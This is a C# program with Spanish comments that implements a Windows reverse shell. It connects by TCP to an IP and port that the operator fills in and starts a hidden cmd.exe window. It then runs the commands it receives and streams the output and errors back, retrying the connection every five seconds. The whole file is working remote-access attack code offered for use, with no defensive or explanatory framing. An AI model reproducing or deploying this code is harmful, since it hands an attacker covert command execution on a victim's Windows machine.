using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class Program
{
    static bool exitRequested = false;

    public static void Main(string[] args)
    {
        string ip = "127.0.0.1"; // Reemplaza con tu IP
        int port = 4444;         // Reemplaza con el puerto que estás escuchando

        // Hilo que escucha si se presiona 'q' para salir
        Thread keyListener = new Thread(() =>
        {
            while (true)
            {
                if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.Q)
                {
                    exitRequested = true;
                    break;
                }
                Thread.Sleep(100);
            }
        });

        keyListener.IsBackground = true;
        keyListener.Start();

        while (!exitRequested)
        {
            StreamWriter writer = null;

            try
            {
                using (TcpClient client = new TcpClient(ip, port))
                using (Stream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (writer = new StreamWriter(stream))
                {
                    writer.AutoFlush = true;

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.RedirectStandardError = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.StartInfo.CreateNoWindow = true;

                    // Captura de salida estándar
                    cmd.OutputDataReceived += (sendingProcess, outLine) =>
                    {
                        if (!string.IsNullOrEmpty(outLine.Data))
                            writer.WriteLine(outLine.Data);
                    };

                    // Captura de errores estándar
                    cmd.ErrorDataReceived += (sendingProcess, errorLine) =>
                    {
                        if (!string.IsNullOrEmpty(errorLine.Data))
                            writer.WriteLine("[ERROR] " + errorLine.Data);
                    };

                    cmd.Start();
                    cmd.BeginOutputReadLine();
                    cmd.BeginErrorReadLine();

                    while (!exitRequested)
                    {
                        string command = reader.ReadLine();
                        if (command == null || command.ToLower() == "exit")
                            break;

                        cmd.StandardInput.WriteLine(command);
                    }

                    cmd.Close();
                }
            }
            catch (Exception ex)
            {
                if (writer != null)
                {
                    try { writer.WriteLine("[EXCEPTION] " + ex.Message); }
                    catch { /* Ignora si falla el envío */ }
                }

                if (exitRequested) break;
                Thread.Sleep(5000);
            }
        }

        Console.WriteLine("Programa finalizado.");
    }
}
